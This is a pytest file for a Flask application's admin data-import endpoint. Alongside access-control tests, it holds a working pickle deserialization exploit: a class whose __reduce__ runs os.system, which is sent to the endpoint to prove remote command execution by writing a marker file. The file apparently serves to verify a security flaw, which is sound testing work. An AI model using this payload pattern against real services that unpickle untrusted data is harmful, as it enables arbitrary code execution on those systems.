import base64
import os
import pickle
import tempfile
import pytest


@pytest.fixture
def app():
    from app import create_app, db
    from app.core.models import User
    from werkzeug.security import generate_password_hash

    application = create_app(config_object="config.TestConfig")
    application.config["TESTING"] = True

    with application.app_context():
        db.drop_all()
        db.create_all()
        db.session.add_all([
            User(id=1, username="attacker", email="a@test.local",
                 password_hash=generate_password_hash("Password123!"), role="customer"),
            User(id=3, username="admin", email="admin@test.local",
                 password_hash=generate_password_hash("ChangeMe_Admin!2024"), role="admin"),
        ])
        db.session.commit()
        yield application


@pytest.fixture
def client(app):
    return app.test_client()


def test_requires_admin_role(client):
    client.post("/login", data={"username": "attacker", "password": "Password123!"})
    resp = client.post("/admin/import-data", json={"payload": "irrelevant"})
    assert resp.status_code == 403


def test_normal_object_import_works(client):
    client.post("/login", data={"username": "admin", "password": "ChangeMe_Admin!2024"})
    payload = base64.b64encode(pickle.dumps({"customers_imported": 5})).decode()
    resp = client.post("/admin/import-data", json={"payload": payload})
    assert resp.status_code == 200


def test_pickle_deserialization_achieves_command_execution(client):
    """THE VULNERABILITY. Verified command execution via __reduce__,
    not just theoretical deserialization risk."""
    client.post("/login", data={"username": "admin", "password": "ChangeMe_Admin!2024"})

    fd, marker_path = tempfile.mkstemp()
    os.close(fd)
    os.remove(marker_path)  # file must not exist yet -- created by the exploit

    class Exploit:
        def __reduce__(self):
            return (os.system, (f"echo deserialization_rce_proof > {marker_path}",))

    payload = base64.b64encode(pickle.dumps(Exploit())).decode()
    resp = client.post("/admin/import-data", json={"payload": payload})
    assert resp.status_code == 200

    assert os.path.exists(marker_path)
    with open(marker_path) as f:
        assert "deserialization_rce_proof" in f.read()

    os.remove(marker_path)
